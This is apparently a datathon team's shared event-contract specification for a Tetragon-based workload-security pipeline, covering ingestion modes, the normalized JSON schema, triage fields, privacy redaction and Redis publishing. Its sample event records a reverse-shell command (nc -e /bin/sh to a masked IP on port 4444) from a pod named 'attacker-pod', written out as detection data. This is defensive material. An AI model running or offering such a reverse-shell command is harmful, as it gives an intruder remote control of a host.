# Workload Security — Shared Event Contract (Schema v1.0.0)

**Owner:** Person 2 (Event Pipeline Engineer)  
**Consumers:** Person 3 (Detection/AI/Remediation), Person 4 (Dashboard/Integration), Person 1 (Platform/Deploy)  
**Status:** Canonical Source of Truth for Datathon 2026  

---

## 1. Pipeline Data Flow

```text
  [Tetragon eBPF / JSONL Fixture / Stdin]
                     │
                     ▼
             forwarder/main.py (Unified Ingestion)
                     │
                     ▼
          forwarder/transformer.py (Validation + UTC Normalization)
                     │
                     ▼
           forwarder/redaction.py (Field-Aware Privacy Filter)
                     │
                     ▼
           forwarder/publisher.py (Exponential Backoff Publishing)
                     │
                     ▼
        Redis Stream: security:events {"event": "<JSON_STRING>"}
                     │
         ┌───────────┴───────────┐
         ▼                       ▼
  dashboard_api.py        detection/orchestrator
(Incident Ledger / UI)    (Explainability & Action)
```

---

## 2. Ingestion Modes

| Ingestion Mode | Flag / Trigger | `capture_mode` Value | `event_source` Value | Notes |
|---|---|---|---|---|
| **Fixture Replay** | `--mode fixture_replay` or `--file <path>` | `"fixture_replay"` | `"tetragon-replay"` | **Default mode**. Safe, reproducible demo on LinuxONE without live kernel tracing. |
| **Standard Input** | `--mode stdin` or `--stdin` | `"stdin"` | `"tetragon-replay"` | Piped streams (`cat events.jsonl \| python -m forwarder.main --stdin`). |
| **Live Tetragon** | `--mode live_tetragon` or `--mode live` | `"live_tetragon"` | `"tetragon"` | Connects to `tetra` CLI / gRPC socket. Never claimed unless live kernel tracing is proven active. |

> **Critical Rule:** Replay and fixture events are **never** labeled as `"live_tetragon"`.

---

## 3. Canonical Normalized Event Schema (`schema_version: "1.0.0"`)

Every event published to the Redis stream adheres to the following JSON structure:

```json
{
  "event_id": "a9103e91-4cf1-4a41-b062-81498b8c5417",
  "schema_version": "1.0.0",
  "capture_mode": "fixture_replay",
  "event_source": "tetragon-replay",
  "source_host": "linuxone-node-01",
  "source_arch": "s390x",
  "timestamp": "2026-03-06T07:30:05.000Z",
  "source": "tetragon",
  "event_type": "process_exec",
  "node_name": "kind-worker",
  "telemetry": {
    "pid": 4830,
    "binary": "/bin/nc",
    "args": [
      "-e",
      "/bin/sh",
      "10.0.0.xxx",
      "4444"
    ],
    "uid": 0,
    "user": "root",
    "cwd": "/",
    "namespace": "default",
    "pod": "attacker-pod",
    "container_id": "abc123de...",
    "parent_binary": "/usr/bin/curl",
    "parent_pid": 4821
  },
  "privacy": {
    "enabled": true,
    "redacted": true,
    "redacted_fields": [
      "args.ip",
      "container_id"
    ],
    "policy": "standard"
  },
  "triage": {
    "grade": "TP",
    "confidence": 0.95,
    "basis": "heuristic_rules",
    "score_type": "risk_score",
    "risk_score": 6,
    "evidence": [
      "binary on high-risk list (network/dual-use tool) +2",
      "process runs as uid 0 (root) +2"
    ]
  },
  "explanation": {
    "mitre_id": "N/A",
    "guidance": "Heuristic rule engine identified True Positive (risk_score=6).",
    "confidence_semantics": "Rule-engine confidence (0-1) reflects how strongly the matched risk signals support the grade. It is not a calibrated probability.",
    "recommended_action": "Escalate to a human analyst; consider isolating the pod and collect process lineage before any remediation."
  },
  "remediation": null
}
```

### 3.1 Person 3 Extension Fields (additive, optional)

These fields extend `triage` / `explanation` without breaking schema `1.0.0`.
Consumers that do not know them must ignore them.

| Field | Type | Meaning |
|---|---|---|
| `triage.basis` | `string` | Which engine produced the grade: `heuristic_rules`, `model+heuristic_gates`, or `fail_safe`. |
| `triage.score_type` | `string` | Always `"risk_score"` for the additive rule score. |
| `triage.risk_score` | `integer` | Additive score over safety signals (0–14). Thresholds: ≥5 TP, ≥3 BP, else FP. |
| `triage.evidence` | `list[string]` | Human-readable list of matched signals and their weights; the explanation of the score. |
| `explanation.confidence_semantics` | `string` | Plain-language meaning of `confidence` (rule confidence vs. model softmax score). |
| `explanation.recommended_action` | `string` | Conservative analyst next step for this grade; never an automatic remediation order. |
| `provenance.external_enrichment` | `bool` | Whether any external service (Gemini/Pinecone) was used for this analysis. |
| `provenance.mitre_mapping` | `string` | `offline_rules`, `pinecone_rag`, `skipped`, or `pending`. |
| `provenance.report_source` | `string` | `offline_template`, `llm`, `fallback`, or `auto_suppressed`. |
| `provenance.sanitized_input` | `bool` | Whether scrubbed (redacted) values were used in an external prompt. |

> **Confidence wording rule:** detection confidence is a signal strength, not a
> statistical probability of the event being malicious. UIs and reports must
> not render it as a "94% chance this is an attack".

---

## 4. Field Specification

### Top-Level Fields

| Field Name | Type | Required? | Description |
|---|---|---|---|
| `event_id` | `string` | **Yes** | Stable unique UUIDv4 identifier. |
| `schema_version` | `string` | **Yes** | Contract version, e.g. `"1.0.0"`. |
| `capture_mode` | `string` | **Yes** | `"fixture_replay"`, `"live_tetragon"`, or `"stdin"`. |
| `event_source` | `string` | **Yes** | `"tetragon"` (live) or `"tetragon-replay"` (offline/fixture). |
| `source_host` | `string` | **Yes** | Privacy-safe node identifier (e.g. `"linuxone-node-01"`). |
| `source_arch` | `string` | **Yes** | CPU architecture (e.g. `"s390x"`, `"x86_64"`). |
| `timestamp` | `string` | **Yes** | ISO-8601 UTC timestamp ending in `Z`. |
| `source` | `string` | **Yes** | Telemetry provider (always `"tetragon"`). |
| `event_type` | `string` | **Yes** | One of: `process_exec`, `process_exit`, `process_kprobe`, `process_tracepoint`, `process_loader`. |
| `node_name` | `string` | **Yes** | Cluster node name or `"unknown"`. |
| `telemetry` | `object` | **Yes** | Detailed kernel / container execution context. |
| `privacy` | `object` | **Yes** | Privacy redaction audit block. |
| `triage` | `object \| null` | Optional | Populated by forwarder ML/heuristics or Person 3 triage engine. |
| `explanation` | `object \| null`| Optional | Explainability metadata (MITRE ATT&CK mapping, rationale). |
| `remediation` | `object \| null`| Optional | Human-approved remediation proposal. |

### Telemetry Sub-Fields

| Field Name | Type | Required? | Redaction Behavior |
|---|---|---|---|
| `pid` | `integer` | **Yes** | Retained (numeric process ID). |
| `binary` | `string` | **Yes** | Retained (necessary for behavioral threat classification). |
| `args` | `list[string]` | **Yes** | Sensitive tokens, passwords, and IPv4 addresses are masked (`10.0.0.xxx`). |
| `uid` | `integer` | **Yes** | Retained. |
| `user` | `string` | **Yes** | System users (`root`, `nobody`, `www-data`) are retained; personal accounts are masked to `[REDACTED_USER]`. |
| `cwd` | `string` | Optional | Sensitive paths (`/root/.ssh`, `/etc/shadow`) masked. |
| `namespace` | `string` | Optional | Kubernetes namespace. |
| `pod` | `string` | Optional | Kubernetes pod name. |
| `container_id` | `string` | Optional | Truncated to 8 characters (`abc123de...`) to prevent host leakage. |
| `parent_binary`| `string` | Optional | Parent binary path. |
| `parent_pid` | `integer` | Optional | Parent process ID. |
| `kprobe` | `object` | Optional | Syscall arguments, function name, and return value (IPs masked). |

---

## 5. Privacy Redaction Contract

Privacy redaction executes **before Redis persistence, logging, and outbound enrichment**:

```json
"privacy": {
  "enabled": true,
  "redacted": true,
  "redacted_fields": ["args.ip", "container_id", "user"],
  "policy": "standard"
}
```

- When `PRIVACY_REDACTION_ENABLED=false`:
  ```json
  "privacy": {
    "enabled": false,
    "redacted": false,
    "redacted_fields": [],
    "policy": "disabled"
  }
  ```
- **Logging Rule:** Application loggers must only print summaries via `sanitize_for_logging(event)`. Raw command line arguments or payload strings are never written to log files.

---

## 6. Redis Publishing Layout

- **Stream Key:** `security:events` (configurable via `REDIS_STREAM_KEY`).
- **Entry Structure:**
  ```text
  XADD security:events MAXLEN ~ 10000 * event "<SERIALIZED_JSON_STRING>"
  ```
- **Consumer Compatibility:**
  Consumers (e.g. `dashboard_api.py`) read from the stream via `XREAD` or `XREVRANGE` and parse the `"event"` field with `json.loads(fields["event"])`. All existing fields are preserved without breaking backward compatibility.

---

## 7. Fault Tolerance & Malformed Record Policy

- **Invalid Records:** Unparseable JSON lines or non-dict payloads are rejected at the parsing boundary.
- **Quarantine Action:** Error counter `_metrics["errors_total"]` is incremented, and a sanitized warning is logged without printing the raw payload.
- **Pipeline Continuity:** Processing immediately continues to the next record without service crashes or infinite retry loops.
